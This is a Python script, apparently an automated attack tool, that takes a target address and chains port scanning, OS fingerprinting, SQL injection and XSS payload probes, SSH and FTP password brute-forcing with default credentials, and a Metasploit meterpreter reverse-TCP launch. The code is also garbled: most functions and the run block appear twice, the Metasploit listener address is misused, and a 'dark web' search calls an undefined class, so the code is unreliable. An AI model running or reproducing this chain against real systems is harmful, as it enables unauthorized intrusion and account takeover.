import socket
import threading
import nmap
import logging
import requests
import whois
import argparse
import scapy
import subprocess
import json
import pdfkit
import winsound
import paramiko
import ftplib
import os
import re
import scapy.all as scapy
from bs4 import BeautifulSoup
from google.cloud import vision


# Function to get GeoIP info
def get_geo_info(target):
    response = requests.get(f"http://ip-api.com/json/{target}")
    return response.json()

# Function to get WHOIS info

# Create a logger
logger = logging.getLogger('scanner')
logger.setLevel(logging.INFO)

# Function to get WHOIS info
def get_whois_info(target):
    try:
        info = whois.whois(target)
        return info
    except Exception as e:
        logger.error(f"WHOIS lookup failed for {target}: {e}")
        return None

# Create a file handler and a stream handler
file_handler = logging.FileHandler('scanner.log')
stream_handler = logging.StreamHandler()

# Create a formatter and set it for the handlers
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
stream_handler.setFormatter(formatter)

# Add the handlers to the logger
logger.addHandler(file_handler)
logger.addHandler(stream_handler)

# Function to get GeoIP info
def get_geo_info(target):
    try:
        response = requests.get(f"http://ip-api.com/json/{target}")
        response.raise_for_status()
        logger.info(f"GeoIP info retrieved for {target}")
        return response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"Error retrieving GeoIP info for {target}: {e}")
        return None

# Function to get WHOIS info
def get_whois_info(target):
    try:
        whois_info = whois.whois(target)
        logger.info(f"WHOIS info retrieved for {target}")
        return whois_info
    except Exception as e:
        logger.error(f"Error retrieving WHOIS info for {target}: {e}")
        return None

# Function to detect OS
def detect_os(target):
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments="-O")
        os_detected = nm[target]["osmatch"][0]["name"] if nm[target]["osmatch"] else "Unknown"
        logger.info(f"OS detected for {target}: {os_detected}")
        return os_detected
    except Exception as e:
        logger.error(f"Error detecting OS for {target}: {e}")
        return "Unknown"

# Function to scan ports
def scan_port(target, port, results):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            results.append(port)
            logger.info(f"Port {port} is open on {target}")
            winsound.Beep(1000, 200)
        sock.close()
    except Exception as e:
        logger.error(f"Error scanning port {port} on {target}: {e}")

# Function to check SQL Injection vulnerability
def check_sql_injection(target):
    try:
        payload = "' OR '1'='1"
        response = requests.get(f"http://{target}/login.php?username=admin&password={payload}")
        response.raise_for_status()
        if "Welcome" in response.text:
            logger.info(f"SQL Injection vulnerability detected on {target}")
            return True
        else:
            logger.info(f"No SQL Injection vulnerability detected on {target}")
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Error checking SQL Injection vulnerability on {target}: {e}")
        return False

# Function to check XSS vulnerability
def check_xss(target):
    try:
        payload = "<script>alert('XSS')</script>"
        response = requests.get(f"http://{target}/search.php?q={payload}")
        response.raise_for_status()
        if payload in response.text:
            logger.info(f"XSS vulnerability detected on {target}")
            return True
        else:
            logger.info(f"No XSS vulnerability detected on {target}")
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Error checking XSS vulnerability on {target}: {e}")
        return False

# Function to brute force SSH
def brute_force_ssh(target, user, password_list):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in password_list:
            try:
                ssh.connect(target, username=user, password=password, timeout=3)
                logger.info(f"SSH brute force successful on {target} with password {password}")
                return password
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                logger.error(f"Error brute forcing SSH on {target}: {e}")
        logger.info(f"No SSH brute force successful on {target}")
        return None
    except Exception as e:
        logger.error(f"Error brute forcing SSH on {target}: {e}")
        return None

# Function to brute force FTP
def brute_force_ftp(target, user, password_list):
    try:
        for password in password_list:
            try:
                ftp = ftplib.FTP(target)
                ftp.login(user, password)
                logger.info(f"FTP brute force successful on {target} with password {password}")
                return password
            except ftplib.error_perm:
                continue
            except Exception as e:
                logger.error(f"Error brute forcing FTP on {target}: {e}")
        logger.info(f"No FTP brute force successful on {target}")
        return None
    except Exception as e:
        logger.error(f"Error brute forcing FTP on {target}: {e}")
        return None

# Function to execute Metasploit exploit
def execute_metasploit(target):
    try:
        payload = f"""
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST {target}
        set LPORT 4444
        exploit
        """
        subprocess.run(["msfconsole", "-q", "-x", payload])
        logger.info(f"Metasploit exploit executed on {target}")
    except Exception as e:
        logger.error(f"Error executing Metasploit exploit on {target}: {e}")

# Function to scan dark web for leaks
def dark_web_scan(target):
    try:
        darknet = Darknet()
        results = darknet.search(target)
        logger.info(f"Dark web scan completed on {target}")
        return results
    except Exception as e:
        logger.error(f"Error scanning dark web for {target}: {e}")
        return None

# Function to start scan
def start_scan(target, start_port, end_port):
    try:
        results = []
        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(target, port, results))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        # Extra Recon Tasks
        os_detected = detect_os(target)
        geo_info = get_geo_info(target)
        whois_info = get_whois_info(target)
        sql_vuln = check_sql_injection(target)
        xss_vuln = check_xss(target)

        # Brute Force Attacks
        password_list = ["admin", "123456", "password", "root", "toor"]
        ssh_password = brute_force_ssh(target, "root", password_list)
        ftp_password = brute_force_ftp(target, "admin", password_list)

        # Metasploit Attack
        execute_metasploit(target)

        # Dark Web Search
        dark_web_results = dark_web_scan(target)

        # Save Results
        report = {
            "Target": target,
            "Open Ports": results,
            "OS Detected": os_detected,
            "GeoIP": geo_info,
            "WHOIS": whois_info,
            "SQL Injection Vulnerable": sql_vuln,
            "XSS Vulnerable": xss_vuln,
            "SSH Brute Force": ssh_password,
            "FTP Brute Force": ftp_password,
            "Dark Web Leaks": dark_web_results
        }
        with open("scan_results.json", "w") as file:
            json.dump(report, file, indent=4)
        pdfkit.from_file("scan_results.json", "scan_results.pdf")
        logger.info(f"Scan completed on {target}")
        return report
    except Exception as e:
        logger.error(f"Error starting scan on {target}: {e}")
        return None

# Run the scanner
target_ip = input("Enter Target IP/Domain: ")
start_port = int(input("Enter Start Port: "))
end_port = int(input("Enter End Port: "))

results = start_scan(target_ip, start_port, end_port)
print(json.dumps(results, indent=4))

def get_whois_info(target):
    return whois.whois(target)

# Function to detect OS
def detect_os(target):
    nm = nmap.PortScanner()
    nm.scan(target, arguments="-O")
    return nm[target]["osmatch"][0]["name"] if nm[target]["osmatch"] else "Unknown"

# Function to scan ports
def scan_port(target, port, results):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        results.append(port)
        winsound.Beep(1000, 200)
    sock.close()

# Function to check SQL Injection vulnerability
def check_sql_injection(target):
    payload = "' OR '1'='1"
    response = requests.get(f"http://{target}/login.php?username=admin&password={payload}")
    return "Welcome" in response.text

# Function to check XSS vulnerability
def check_xss(target):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(f"http://{target}/search.php?q={payload}")
    return payload in response.text

# Function to brute force SSH
def brute_force_ssh(target, user, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target, username=user, password=password, timeout=3)
            return password
        except:
            pass
    return None

# Function to brute force FTP
def brute_force_ftp(target, user, password_list):
    for password in password_list:
        try:
            ftp = ftplib.FTP(target)
            ftp.login(user, password)
            return password
        except:
            pass
    return None

# Function to execute Metasploit exploit
def execute_metasploit(target):
    payload = f"""
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST {target}
    set LPORT 4444
    exploit
    """
    subprocess.run(["msfconsole", "-q", "-x", payload])

# Function to scan dark web for leaks
def dark_web_scan(target):
    darknet = Darknet()
    return darknet.search(target)

# Function to start scan
def start_scan(target, start_port, end_port):
    results = []
    threads = []
    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(target, port, results))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

    # Extra Recon Tasks
    os_detected = detect_os(target)
    geo_info = get_geo_info(target)
    whois_info = get_whois_info(target)
    sql_vuln = check_sql_injection(target)
    xss_vuln = check_xss(target)

    # Brute Force Attacks
    password_list = ["admin", "123456", "password", "root", "toor"]
    ssh_password = brute_force_ssh(target, "root", password_list)
    ftp_password = brute_force_ftp(target, "admin", password_list)

    # Metasploit Attack
    execute_metasploit(target)

    # Dark Web Search
    dark_web_results = dark_web_scan(target)

    # Save Results
    report = {
        "Target": target,
        "Open Ports": results,
        "OS Detected": os_detected,
        "GeoIP": geo_info,
        "WHOIS": whois_info,
        "SQL Injection Vulnerable": sql_vuln,
        "XSS Vulnerable": xss_vuln,
        "SSH Brute Force": ssh_password,
        "FTP Brute Force": ftp_password,
        "Dark Web Leaks": dark_web_results
    }
    with open("scan_results.json", "w") as file:
        json.dump(report, file, indent=4)
    pdfkit.from_file("scan_results.json", "scan_results.pdf")

    return report

# Run the scanner
target_ip = input("Enter Target IP/Domain: ")
start_port = int(input("Enter Start Port: "))
end_port = int(input("Enter End Port: "))

results = start_scan(target_ip, start_port, end_port)
print(json.dumps(results, indent=4))
